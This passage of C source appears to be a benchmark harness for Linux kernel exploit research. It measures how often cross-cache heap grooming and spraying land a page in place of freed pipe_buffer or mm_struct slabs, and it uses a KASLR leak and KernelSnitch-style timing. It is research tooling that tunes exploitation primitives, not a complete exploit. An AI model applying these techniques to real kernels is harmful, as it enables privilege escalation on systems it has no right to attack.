    t->grooms++;
    if (!strcmp(method->name, "pipe-bare")) {
        /* No bytes of ours are on this page -- judged by whether real
         * pipe_buffer arrays are, via bench_judge_pipe(). */
        unsigned matches = bench_judge_pipe(base, g_anon_pipe_buf_ops);

        if (matches > 0) {
            t->landed++;
            verdict = "LANDED";
        } else {
            t->missed++;
            verdict = "page was not ours";
        }
        printf("  %5d  0x%016llx  %-19s  ops-matches=%u/%d\n", round,
               (unsigned long long)base, verdict, matches, BENCH_PIPE_SCAN_SLOTS);
    } else if (lib_kprobe_read64((uint64_t)base + BENCH_SELFNAME_OFF, &seen)) {
        t->unreadable++;
        verdict = "page could not be read";
        printf("  %5d  0x%016llx  %s\n", round, (unsigned long long)base, verdict);
    } else if (seen == (uint64_t)base) {
        t->landed++;
        verdict = "LANDED";
        printf("  %5d  0x%016llx  %s\n", round, (unsigned long long)base, verdict);
    } else {
        t->missed++;
        verdict = "page was not ours";
        printf("  %5d  0x%016llx  %s\n", round, (unsigned long long)base, verdict);
        if (seen)
            printf("         read 0x%016llx\n", (unsigned long long)seen);
    }

    /* Now that it has been judged, release everything the groom and the refill
     * allocated. Nothing in the kernel was ever made to point at this page, so
     * there is nothing to put back -- and releasing it is what lets the next
     * groom have it. */
    crosscache_cleanup();
}

static void bench_series(const struct crosscache_method *method,
                         const struct crosscache_cfg *cfg, size_t nspray,
                         int rounds, struct tally *t)
{
    struct crosscache_request req;

    memset(t, 0, sizeof(*t));
    memset(&req, 0, sizeof(req));
    req.cfg = *cfg;
    req.compose = bench_compose;
    req.inspect = bench_inspect;
    req.user = t;
    req.send_bytes = BENCH_SEND_BYTES;
    req.nspray = nspray;

    printf("\n");
    printf("  method %s, %zu refill send%s per placement -- %s\n", method->name,
           nspray, nspray == 1 ? "" : "s", method->summary);
    printf("  round  page                 verdict\n");
    printf("  -----  -------------------  --------------------------------\n");
    for (int round = 1; round <= rounds; round++)
        bench_round(method, &req, round, t);
    printf("  -----  -------------------  --------------------------------\n");
}

/* Parse "1,2,4,8" into the spray counts to try, in order. */
static size_t parse_sweep(const char *text, size_t *out, size_t max)
{
    size_t n = 0;

    while (*text && n < max) {
        char *end;
        unsigned long v = strtoul(text, &end, 0);

        if (end == text)
            break;
        if (v >= 1)
            out[n++] = (size_t)v;
        text = (*end == ',') ? end + 1 : end;
    }
    return n;
}

int main(int argc, char **argv)
{
    struct crosscache_cfg cfg = CROSSCACHE_CFG_PANTHER_61;
    const struct crosscache_method *chosen[4];
    size_t sprays[8] = { 1 };
    size_t nsweep = 1, nmethod = 0;
    struct tally t[4][8];
    int rounds = 20;
    unsigned judged_total = 0;

    setvbuf(stdout, NULL, _IONBF, 0);
    for (int i = 1; i + 1 < argc; i++) {
        if (!strcmp(argv[i], "--rounds")) {
            rounds = (int)strtol(argv[i + 1], NULL, 0);
            if (rounds < 1)
                rounds = 1;
        } else if (!strcmp(argv[i], "--nspray")) {
            sprays[0] = (size_t)strtoul(argv[i + 1], NULL, 0);
            if (!sprays[0])
                sprays[0] = 1;
            nsweep = 1;
        } else if (!strcmp(argv[i], "--sweep")) {
            size_t n = parse_sweep(argv[i + 1], sprays,
                                   sizeof(sprays) / sizeof(sprays[0]));

            if (n)
                nsweep = n;
        } else if (!strcmp(argv[i], "--precede-leak")) {
            g_precede_leak = (int)strtol(argv[i + 1], NULL, 0) != 0;
        } else if (!strcmp(argv[i], "--pipe-drain-slabs")) {
            g_pipe_drain_slabs = (size_t)strtoul(argv[i + 1], NULL, 0);
        } else if (!strcmp(argv[i], "--pipe-reclaim-slabs")) {
            g_pipe_reclaim_slabs = (size_t)strtoul(argv[i + 1], NULL, 0);
        } else if (!strcmp(argv[i], "--mm-partials")) {
            g_mm_partials = (size_t)strtoul(argv[i + 1], NULL, 0);
        } else if (!strcmp(argv[i], "--latency-probe")) {
            g_latency_probe = (int)strtol(argv[i + 1], NULL, 0) != 0;
        } else if (!strcmp(argv[i], "--calibrate-signal")) {
            g_calibrate_n = (size_t)strtoul(argv[i + 1], NULL, 0);
            if (!g_calibrate_n) g_calibrate_n = BENCH_CALIBRATE_SPRAY;
        } else if (!strcmp(argv[i], "--pcp-trial")) {
            g_pcp_trial_n = (size_t)strtoul(argv[i + 1], NULL, 0);
            if (!g_pcp_trial_n) g_pcp_trial_n = BENCH_PCP_DEFAULT_N;
        } else if (!strcmp(argv[i], "--pcp-order")) {
            g_pcp_order = (unsigned)strtoul(argv[i + 1], NULL, 0);
        } else if (!strcmp(argv[i], "--pcp-spray-n")) {
            g_pcp_spray_n = (size_t)strtoul(argv[i + 1], NULL, 0);
        } else if (!strcmp(argv[i], "--pspray-calibrate")) {
            g_pspray_n = (size_t)strtoul(argv[i + 1], NULL, 0);
            if (!g_pspray_n) g_pspray_n = BENCH_PSPRAY_SPRAY;
        } else if (!strcmp(argv[i], "--pspray-warmup")) {
            g_pspray_warmup = (size_t)strtoul(argv[i + 1], NULL, 0);
        } else if (!strcmp(argv[i], "--pspray-bytes")) {
            g_pspray_bytes = (size_t)strtoul(argv[i + 1], NULL, 0);
            if (!g_pspray_bytes) g_pspray_bytes = 64;
        } else if (!strcmp(argv[i], "--method")) {
            const char *s = argv[i + 1];

            nmethod = 0;
            while (*s && nmethod < sizeof(chosen) / sizeof(chosen[0])) {
                char name[32];
                size_t k = 0;

                while (*s && *s != ',' && k + 1 < sizeof(name))
                    name[k++] = *s++;
                name[k] = '\0';
                if (*s == ',')
                    s++;
                chosen[nmethod] = crosscache_method_named(name);
                if (!chosen[nmethod]) {
                    printf("BENCH_GATE_FAIL reason=unknown_method name=%s\n", name);
                    return LIB_OUTCOME_USAGE;
                }
                nmethod++;
            }
        }
    }
    if (g_calibrate_n) {
        /* Purely userspace timing -- no kernel read is involved in taking the
         * measurement itself, so this runs with no root gate and does not
         * touch anything the rest of main() sets up. It is not a placement
         * and reports no rate; it is the calibration pass the SLUBStick gate
         * this bench once shipped should have been built from. */
        bench_calibrate_signal((size_t)(4096ULL << MM_ORDER) * 2, g_calibrate_n);
        return LIB_OUTCOME_PASS;
    }
    if (g_pspray_n) {
        /* Also purely userspace timing -- same no-root, no-setup case as
         * --calibrate-signal above, and mutually exclusive with it the same
         * way: this prints its own series and exits before anything else in
         * main() runs. */
        bench_pspray_calibrate(g_pspray_warmup ? g_pspray_warmup : BENCH_PSPRAY_WARMUP,
                                g_pspray_n, g_pspray_bytes);
        return LIB_OUTCOME_PASS;
    }

    if (!nmethod) {
        /* No choice made: measure every method there is, which is what a
         * comparison wants and costs nothing extra to state. */
        size_t available;
        const struct crosscache_method *all = crosscache_methods(&available);

        for (size_t i = 0; i < available && i < sizeof(chosen) / sizeof(chosen[0]); i++)
            chosen[nmethod++] = &all[i];
    }

    if (!lib_kprobe_read_available()) {
        printf("BENCH_GATE_FAIL reason=no_privileged_read uid=%d\n", (int)geteuid());
        printf("RESULT this measures placements by reading the placed page, which\n"
               "RESULT needs root and a mounted tracing interface. Neither is used\n"
               "RESULT to place anything -- only to judge what was placed.\n");
        return LIB_OUTCOME_PRECONDITION_FAIL;
    }

    if (g_pcp_trial_n) {
        /* Unlike --calibrate-signal, this DOES need root: lib_pagemap_pfn()
         * needs CAP_SYS_ADMIN for a real PFN, which is exactly what
         * lib_kprobe_read_available() above already confirmed is present --
         * their own kernel module gave them the same fact for free. */
        bench_pcp_trial(g_pcp_trial_n, g_pcp_order, g_pcp_spray_n);
        return LIB_OUTCOME_PASS;
    }

    raise_descriptor_limit();
    cfg.mm_struct_sz = MM_STRUCT_SZ;
    cfg.mm_order = MM_ORDER;
    if (g_pipe_drain_slabs) cfg.pipe_drain_slabs = g_pipe_drain_slabs;
    if (g_pipe_reclaim_slabs) cfg.pipe_reclaim_slabs = g_pipe_reclaim_slabs;
    if (g_mm_partials) cfg.mm_partials = g_mm_partials;
    if (g_pipe_drain_slabs || g_pipe_reclaim_slabs || g_mm_partials)
        printf("  override: pipe_drain_slabs=%zu (%zu pipes)  pipe_reclaim_slabs=%zu (%zu pipes)  "
               "mm_partials=%zu\n",
               cfg.pipe_drain_slabs, cfg.pipe_objs_per_slab * cfg.pipe_drain_slabs,
               cfg.pipe_reclaim_slabs, cfg.pipe_objs_per_slab * cfg.pipe_reclaim_slabs,
               cfg.mm_partials);

    for (size_t m = 0; m < nmethod; m++) {
        if (strcmp(chosen[m]->name, "pipe-bare"))
            continue;
        /* Unprivileged and independent of the root this bench also needs --
         * paid once, here, rather than once per round. */
        unsigned long long text_base = LIB_KASLR_LEAK_TEXT_CHECKED();

        if (!text_base) {
            printf("BENCH_GATE_FAIL reason=no_kaslr_leak (needed to judge pipe-bare)\n");
            return LIB_OUTCOME_PRECONDITION_FAIL;
        }
        g_anon_pipe_buf_ops = text_base + ANON_PIPE_BUF_OPS_OFF;
        printf("  pipe-bare judge: anon_pipe_buf_ops=%#llx (text_base=%#llx)\n",
               g_anon_pipe_buf_ops, text_base);
        break;
    }

    printf("\n");
    printf("  cross-cache placement, judged by reading the placed page at page+%#x\n",
           (unsigned)BENCH_SELFNAME_OFF);
    printf("  %d round%s at each of %zu method%s x %zu refill count%s\n", rounds,
           rounds == 1 ? "" : "s", nmethod, nmethod == 1 ? "" : "s", nsweep,
           nsweep == 1 ? "" : "s");
    for (size_t m = 0; m < nmethod; m++)
        printf("  method %-7s applies when %s\n", chosen[m]->name, chosen[m]->applies);

    for (size_t m = 0; m < nmethod; m++)
        for (size_t s = 0; s < nsweep; s++)
            bench_series(chosen[m], &cfg, sprays[s], rounds, &t[m][s]);

    printf("\n  method   nspray  rounds  landed  rate   no page  unreadable%s\n",
           g_precede_leak ? "  precede-avg" : "");
    printf("  -------  ------  ------  ------  -----  -------  ----------%s\n",
           g_precede_leak ? "  -----------" : "");
    for (size_t m = 0; m < nmethod; m++) {
        for (size_t s = 0; s < nsweep; s++) {
            unsigned judged = t[m][s].landed + t[m][s].missed;

            judged_total += judged;
            printf("  %-7s  %6zu  %6d  %6u  ", chosen[m]->name, sprays[s], rounds,
                   t[m][s].landed);
            if (judged)
                printf("%4u%%", t[m][s].landed * 100 / judged);
            else
                printf("   - ");
            printf("  %7u  %10u", t[m][s].no_address, t[m][s].unreadable);
            if (g_precede_leak)
                printf("  %9.3fs", t[m][s].precede_secs_sum / rounds);
            printf("\n");
        }
    }
    printf("  -------  ------  ------  ------  -----  -------  ----------%s\n\n",
           g_precede_leak ? "  -----------" : "");
    if (g_precede_leak)
        printf("  Every placement above ran directly behind its own preceding leak "
               "(--precede-leak 1).\n  Run the same command with --precede-leak 0 and "
               "diff the `rate` columns: that is\n  the whole test -- same method, same "
               "nspray, same rounds, the only variable is\n  whether an unrelated "
               "KernelSnitch run against the same mm_struct/order-3 class\n  ran "
               "immediately before each placement's own, in the same process.\n\n");

    for (size_t m = 0; m < nmethod; m++)
        for (size_t s = 0; s < nsweep; s++) {
            unsigned judged = t[m][s].landed + t[m][s].missed;

            printf("RESULT method=%s nspray=%zu  landed %u / %u judged",
                   chosen[m]->name, sprays[s], t[m][s].landed, judged);
            if (judged)
                printf("  (%u%%)", t[m][s].landed * 100 / judged);
            printf("   [no page %u, unreadable %u | leaked-object live %u dead %u"
                   " | filler ok %u absent %u]\n",
                   t[m][s].no_address, t[m][s].unreadable, t[m][s].live_obj,
                   t[m][s].dead_obj, t[m][s].filler_ok, t[m][s].filler_bad);
        }
    if (!judged_total)
        printf("RESULT no round could be judged, so nothing was measured.\n");
    else
        printf("CROSSCACHE_BENCH_JUDGED rounds=%u\n", judged_total);
    printf("\n");
    for (size_t m = 0; m < nmethod; m++)
        for (size_t s = 0; s < nsweep; s++)
            printf("CROSSCACHE_BENCH_TOTAL method=%s nspray=%zu rounds=%d landed=%u "
                   "judged=%u no_page=%u unreadable=%u live_obj=%u dead_obj=%u "
                   "filler_ok=%u filler_bad=%u precede_leak=%d precede_avg_secs=%.3f\n",
                   chosen[m]->name, sprays[s], rounds, t[m][s].landed,
                   t[m][s].landed + t[m][s].missed, t[m][s].no_address,
                   t[m][s].unreadable, t[m][s].live_obj, t[m][s].dead_obj,
                   t[m][s].filler_ok, t[m][s].filler_bad, g_precede_leak,
                   t[m][s].precede_secs_sum / rounds);

    return judged_total ? LIB_OUTCOME_PASS : LIB_OUTCOME_REFUSED;
}
